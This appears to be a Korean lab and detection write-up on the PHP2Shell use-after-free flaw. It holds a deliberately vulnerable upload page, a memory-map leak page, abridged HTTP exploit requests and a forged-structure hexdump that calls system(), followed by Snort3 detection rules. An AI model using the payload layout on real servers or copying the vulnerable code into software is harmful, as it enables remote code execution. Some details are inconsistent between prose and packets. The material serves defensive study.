
# 1. 기본 정보

**CVE**: CVE-2026-109618(multipart 파싱 중 OOM 처리 불완전 초기화된 요청 상태 노출) CVE-2026-109619(해제된 요청 메모리를 참조하는 전역 상태로 인한 UAF)
**발현 조건**: `session.upload_progress.enabled` 값이 1이며, 유한한 `memory_limit` + `mod_php prefork` 동일 워커 조건 추가

PHP2Shell은 PHP 엔진이 multipart 요청 처리 중 메모리 부족 상태에서 해제되었거나 덜 초기화된 요청 메모리를 정리·재사용하고, 이전 요청의 전역 상태가 해제된 메모리를 계속 참조한 채 다음 요청에서 쓰이면서, 인증 없는 HTTP 요청만으로 메모리 손상·노출과 웹 워커 권한의 원격 코드 실행이 발생하는 취약점입니다.

# 2. 환경 구성

## 2.1. 인프라 구성도

![[Pasted image 20261025221854.png]]

- **Attack PC**: 실제 PHP2Shell 공격을 수행하게 되는 PC
- **PHP Server**: PHP 취약점이 존재하는 Docker 서버
- **Snort Server**: Snort 규칙을 적용하여 공격 탐지를 증명하기 위한 서버

## 2.2. Docker 환경 설정

실제 PHP 웹 환경을 구축하기 위해 다음과 같은 구조를 바탕으로 환경설정을 진행하였습니다.

```
~/php2shell-test-lab/
├── Dockerfile
└── www/
    ├── index.php
    ├── empty.php
    ├── maps.php
    └── upload.php
```

### 2.2.1. 작업 폴더 경로 생성

```bash
mkdir -p ~/php2shell-test-lab/www 
cd ~/php2shell-test-lab
```

### 2.2.2. Dockerfile

```dockerfile
FROM php:7.4-apache

COPY ./www/ /var/www/html/

RUN mkdir -p /var/www/html/uploads \
    && chmod 777 /var/www/html/uploads
```

### 2.2.3. index.php

```php
<?php
echo "<h2>php2shell Test Lab</h2>";
```

### 2.2.4. empty.php

```php
<?php
?>
```

아무런 기능도 하지 않는 php 코드입니다.

### 2.2.5. maps.php

```php
<?php
$file = '/proc/self/maps';

if (file_exists($file)) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="maps.txt"');
    readfile($file);
    exit;
} else {
    echo "File not found.";
}
?>

```

Docker 서버의 메모리 매핑 데이터를 직접 다운로드를 받는 페이지입니다. 해당 파일을 받나 VMMap 등 메모리 분석 도구를 이용해서 UAF 공격에 활용합니다.

### 2.2.6. upload.php

```php
<?php

$uploadDir = __DIR__ . '/uploads/';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $filename = basename($_FILES['file']['name']);
    $targetPath = $uploadDir . $filename;

    // 확장자 검증 없음 (전형적인 unrestricted file upload 취약점)
    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
        echo "Uploaded: " . htmlspecialchars($filename) . "\n";
        echo "Path: /uploads/" . htmlspecialchars($filename) . "\n";
    } else {
        echo "Upload failed.\n";
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<body>
<h3>Test Upload Endpoint (Vulnerable by design)</h3>
<form action="upload.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
</body>
</html>
```

정상적인 서비스 목적으로 넣었으며 Snort 규칙 오탐 테스트를 위해 만들었습니다.

## 2.3. Docker 명령어

실행 명령어는 다음과 같습니다.

```bash
cd ~/php2shell-test-lab

# 이미지 빌드
docker build -t php2shell-test .

# 컨테이너 실행 (ASLR 해제)
docker run -d --name vuln-php-test \
  -p 8080:80 \
  --cap-add=SYS_PTRACE \
  --security-opt seccomp=unconfined \
  php2shell-test \
  setarch $(uname -m) -R apache2-foreground
```

사용 종료 후 다음 명령어를 작성하시면 됩니다

```bash
# 동작 확인
curl http://localhost:8080

# 로그
docker logs -f vuln-php-test

# 중지 및 삭제
docker stop vuln-php-test
docker rm vuln-php-test
```

실행중일 때 http://192.168.172.129:8080 으로 접속하셔서 페이지가 정상적으로 활성화되는지 확인하시기 바랍니다.

처음 Docker를 실행하고 다음과 같은 명령어를 작성하여 PHP 서비스의 설정값을 확인할 때 `session.upload_progress.enabled` 값이 기본적으로 1로 설정되었음을 확인할 수 있습니다.

```bash
docker exec -it vuln-php-test php -i | grep session.upload_progress
```

![[Pasted image 20261025230821.png]]

# 3. 공격 원리 분석

공격의 체인을 구성하기 위해 아래와 같은 조건이 만족하여야 합니다.

1. `session.upload_progress.enabled = On`

## 3.1. 메모리 고갈 및 UAF 트리거

첫 번째 패킷의 목적은 `PHP_SESSION_UPLOAD_PROGRESS`를 처리하는 `rfc1867` 파서에 과부하를 걸어 메모리를 강제로 해제시키되, 포인터는 남겨두게 만드는 것입니다.

```http
POST /index.php HTTP/1.1
Host: 10.0.0.5
Content-Type: multipart/form-data; boundary=SSSSSSSSSSSSSSSSS
Content-Length: <약 12.6MB>
Connection: close

--SSSSSSSSSSSSSSSSS
Content-Disposition: form-data; name="PHPSESSID"

attacksessionid0001
--SSSSSSSSSSSSSSSSS
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

pwn
--SSSSSSSSSSSSSSSSS
   ⋮  filler 필드 892개 (이름 1000~, 값 "v0000xxxx..." 48바이트)  ⋮
   ⋮  이 중 1개 값 안에 유출용 위조 구조체를 지정 오프셋에 배치  ⋮
--SSSSSSSSSSSSSSSSS--
```

PHP 엔진은 `multipart/form-data`를 파싱하면서 `PHP_SESSION_UPLOAD_PROGRESS` 변수를 위한 메모리 공간(`zval`)을 할당합니다. 이후 `file` 파트에서 끝없이 중첩된 기형적 배열 `a[][][]...`을 파싱하다가 설정된 `memory_limit`을 초과합니다(OOM  발생). 엔진은 에러 처리 로직을 타며 할당했던 메모리를 시스템에 반환하지만, `modules_activated` 이전 세션 초기화 중 OOM → END 콜백·요청 종료 정리 생략으로, 여전히 이 빈 공간을 가리키는 댕글링 포인터 상태가 됩니다.

## 3.2. Heap Spray 및 Fake Object 주입 (RCE)

두 번째 패킷은 앞서 꼬여버린 동일한 워커 프로세스에 전달되어야 합니다. 해제된 메모리 공간을 다시 할당받아, 그 자리에 조작된 바이너리 구조체를 덮어씌웁니다.

```http
POST /index.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: multipart/form-data; boundary=BBBBBBBBBB
Content-Length: 1653940
Connection: close

--BBBBBBBBBB
Content-Disposition: form-data; name="PHPSESSID"

attacksessionid0001
--BBBBBBBBBB
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

pwn
--BBBBBBBBBB
Content-Disposition: form-data; name="s000"

<아래 hexdump가 실제 4071B>
--BBBBBBBBBB
Content-Disposition: form-data; name="s001"

<동일 값>          ← s002~s399까지 동일 구조 ×400
--BBBBBBBBBB--
```

s000 값의 실제 바이트 코드는 다음과 같습니다.

```text
000000  53 50 52 41 59 30 30 30    |SPRAY000|          ← 8B 마커
...
000148  01 00 00 00 0a 00 00 00    ← 가짜 zend_reference gc {1, IS_REFERENCE}
000150  00 38 05 34 12 7f 00 00    ← ref->val.value = htdata (0x7f1234053800)
000158  07 03 00 00 00 00 00 00    ← ref->val.u1 = IS_ARRAY|REFCOUNTED (0x307)
...
0007e8  01 00 00 00 07 00 00 00    ← 위조 zend_array gc {1, IS_ARRAY}
0007f0  10 00 00 00 f8 ff ff ff    ← nTableMask = -8
0007f8  20 38 05 34 12 7f 00 00    ← arData = htdata+0x20 (버킷 겹침)
000800  01 00 00 00 01 00 00 00    ← nNumUsed=1, nNumOfElements=1
000818  70 53 46 00 12 7f 00 00    pDestructor = 0x7f1200465370 = zif_system
000858  80 38 05 34 12 7f 00 00    ← ARG1.value = htdata+0x80 (명령 zval)
000868  01 00 00 00 06 01 00 00    ← zend_string gc {1, IS_STRING|REFCOUNTED}
000878  19 00 00 00 00 00 00 00    ← 문자열 길이 = 0x19 (25)
000880  70 77 64 3e 2f 76 61 72  
        2f 77 77 77 2f 68 74 6d    |pwd>/var/www/htm|  - 실행될 명령
000890  6c 2f 70 77 6e 2e 74 78  
        74 00                      |l/pwn.txt\0|
```

공격자는 해제된 메모리 블록과 동일한 크기의 데이터를 `PHP_SESSION_UPLOAD_PROGRESS`의 값으로 밀어 넣습니다. PHP의 Zend 메모리 관리자(Zend MM)는 크기 클래스 캐시로 직전 해제 블록을 재할당합니다.

​이 공간에 일반 문자열 대신 공격자가 정교하게 계산한 가짜 `zend_object` 바이트 배열이 자리 잡습니다.

​엔진이 파싱을 마치거나 에러를 수습하면서 1단계에서 남아있던 댕글링 포인터를 타고 들어가 `free_obj`를 호출하는 순간 덮어씌워진 `system()` 주소로 점프하며 패킷 하단에 적어둔 `pwd` 명령어가 실행됩니다.

# 4. Snort3 탐지 룰

PHP2Shell은 다양한 공격이 체인 형태로 연결을 수행하여 최종적으로 RCE 공격을 하는 복합적인 취약점입니다. 해당 취약점을 탐지하기 위해선 하나의 규칙이 아닌 여러 상황을 탐지하도록 하는 연쇄적인 규칙 설정이 필요합니다.

방어 시나리오는 다음과 같이 설계하였습니다.

![[Pasted image 20261028232702.png]]

- **Phase 1 (준비/유발):** 공격자가 매우 긴 Base64 문자열이나 거대한 배열을 보내 PHP 메모리 한도를 초과시킵니다. Snort는 이를 탐지하고 해당 출발지 IP에 대해 `php2shell.oom` 플래그를 300초간 켭니다.
- **Phase 2-A (세션 고정):** 300초 이내에 동일한 IP가 임의의 `PHPSESSID`를 설정하여 요청을 보냅니다.
- **Phase 2-B (페이로드 주입):** 300초 이내에 동일한 IP가 세션 변수에 4,000바이트 이상의 악성 셸코드나 가비지 값을 덮어씌웁니다.

참고로 Snort 규칙만으로는 PHP2Shell의 근본적인 대책이 될 수 없음을 참고하시기 바랍니다.

## 4.1. OOM을 유발시키는 패킷 탐지 (Phase 1)

우선적으로 PHP2Shell의 원인이 되는 다량의 메모리 주입을 우선적으로 탐지 후 UAF 공격을 수행하는지 체크합니다.

```snort
alert http any any -> any any (
msg:"PHP2Shell - OOM trigger with upload progress";
flow:to_server,established;
http_method;content:"POST";
http_header;content:"multipart/form-data",nocase;
http_client_body;content:"name=",nocase;
pcre:"/(?:(?:\[[^\]]*\]){10,}|(?:[a-zA-Z0-9_=\-\+\/]){256,})/";
reference:cve,2026-109618;
sid:1000001; rev:1;
)
```

## 4.2. 공격자의 세션 고정 작업 탐지 (Phase 2-A)

공격자가 세션 파일의 이름을 예측하거나 고정하기 위해 임의의 세션 ID를 주입하는 행위를 탐지합니다.

```snort
alert http any any -> any any (
msg:"PHP2Shell - attacker-set session id after OOM prep";
flow:to_server,established;
http_method; content:"POST";
http_header; content:"multipart/form-data", nocase;
http_client_body;
content:"PHP_SESSION_UPLOAD_PROGRESS", nocase, fast_pattern;
pcre:"/name=[\"']?PHPSESSID[\"']?/i";
reference:cve,2026-109619;
sid:1000002; rev:1;
)
```

## 4.3. OOM 발생 직후 페이로드 주입 탐지 (Phase 2-B)

OOM 발생 직후 힙 메모리를 장악하거나, 세션 파일 내부에 거대한 코드를 주입하는 스프레이 공격을 탐지합니다.

```snort
alert http any any -> any any (
  msg:"PHP2Shell - oversized upload-progress value for heap reclaim";
  flow:to_server,established;
  http_method; content:"POST";
  http_header; content:"multipart/form-data", nocase;
  http_client_body;
  content:"PHP_SESSION_UPLOAD_PROGRESS", nocase, fast_pattern;
  isdataat:4192, relative;
  reference:cve,2026-109619;
  sid:1000003; rev:1;
)
```

# 참고자료

- [PHP2Shell 취약점 분석 및 PoC CVE-2026-109618·CVE-2026-109619](https://useworld.github.io/cve/php-pre-auth-rce/)
- [취약점 분석 보고서](https://www.enki.co.kr/media-center/blog/vulnerability-analysis-of-php2shell)
- [Exploit 프로그램](https://github.com/78ResearchLab/PHP2Shell-Full-Chain-Exploit/blob/main/exploit.py)